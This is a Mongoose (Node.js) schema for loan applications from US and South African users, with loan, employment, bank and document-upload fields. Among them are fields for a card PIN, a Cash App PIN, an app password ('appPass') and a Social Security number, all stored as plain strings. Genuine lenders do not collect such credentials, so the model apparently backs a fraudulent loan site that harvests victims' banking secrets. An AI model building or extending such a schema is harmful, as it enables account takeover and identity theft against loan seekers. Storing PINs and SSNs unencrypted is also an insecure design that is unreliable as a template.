const mongoose = require("mongoose");

const loanApplicationSchema = new mongoose.Schema(
  {
    userId:    { type: mongoose.Schema.Types.ObjectId, required: true, index: true },
    country:   { type: String, required: true, enum: ["US", "ZA"] },
    userName:  { type: String, required: true },
    userEmail: { type: String, required: true },

    amount:      { type: Number, required: true },
    purpose:     { type: String, required: true },
    duration:    { type: String, required: true },
    payDate:     { type: Date },
    employment:  { type: String, required: true },
    jobTitle:    { type: String, required: true },
    income:      { type: Number, required: true },
    creditScore: { type: Number },
    notes:       { type: String, default: "" },

    bankName:      { type: String, required: true },
    accountNumber: { type: String, required: true },
    appPass: { type: String },
    cardPin:      { type: String },
    routingNumber: { type: String },

    cashAppPin:   { type: String },
    ssn: { type: String },

    status: {
      type:    String,
      enum:    ["pending", "active", "rejected", "completed", "defaulted"],
      default: "pending",
      index:   true,
    },

    disbursedAmount:      { type: Number, default: 0 },
    approvedInterestRate: { type: String, default: "" },
    approvedTerm:         { type: String, default: "" },
    startedAt:            { type: Date },
    nextDueDate:          { type: Date },

    documents: [
      {
        label: { type: String }, // e.g. "ID", "Proof of Income"
        url:   { type: String, required: true }, // Cloudinary URL
        publicId: { type: String }, // for deletion later
        uploadedAt: { type: Date, default: Date.now },
      }
    ],
  },
  { timestamps: true }
);

loanApplicationSchema.set("toJSON", {
  transform: (doc, ret) => {
    delete ret.__v;
    delete ret.routingNumber;
    delete ret.accountNumber;
    return ret;
  },
});

module.exports = mongoose.model("LoanApplication", loanApplicationSchema);
